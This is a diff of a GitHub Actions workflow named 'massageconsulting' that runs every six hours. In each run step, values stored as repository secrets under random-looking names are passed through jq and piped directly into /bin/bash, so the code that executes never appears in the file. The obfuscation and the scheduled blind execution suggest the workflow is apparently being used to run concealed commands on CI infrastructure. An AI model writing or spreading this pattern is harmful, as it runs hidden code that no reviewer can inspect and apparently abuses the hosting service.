@@ -1,23 +1,27 @@
 name: massageconsulting
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
+    - cron: '52 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: massageconsulting
         env:
-          ftlx0264: ${{ secrets.ftlx0264 }}
+          sy66670: ${{ secrets.sy66670 }}
         run: |
-          echo $ftlx0264 | jq -r .o98 | /bin/bash
-          echo $vudoi0264 | jq -r .ibzdu2 | /bin/bash
-          echo $mxcwv33891 | jq -r .sqw1354 | /bin/bash
-          echo $fsg876 | jq -r .ox8448 | /bin/bash
-          echo $n063 | jq -r .wr19953 | /bin/bash
-          echo $ehagt0 | jq -r .bj08345 | /bin/bash
-          echo $jpxz90 | jq -r .hmhi48 | /bin/bash
+          echo $sy66670 | jq -r .eje4 | /bin/bash
+          echo $zmqiu230 | jq -r .ixccs2750 | /bin/bash
+          echo $j872 | jq -r .kyff51 | /bin/bash
+          echo $dvs0504 | jq -r .lb40 | /bin/bash
+          echo $vcba97523 | jq -r .ezdk975 | /bin/bash
+          echo $learv58 | jq -r .ylzol6 | /bin/bash
+          echo $dd3906 | jq -r .k4297 | /bin/bash
+          echo $lk66804 | jq -r .yh3 | /bin/bash
+          echo $gazj16373 | jq -r .mcifl61061 | /bin/bash
 
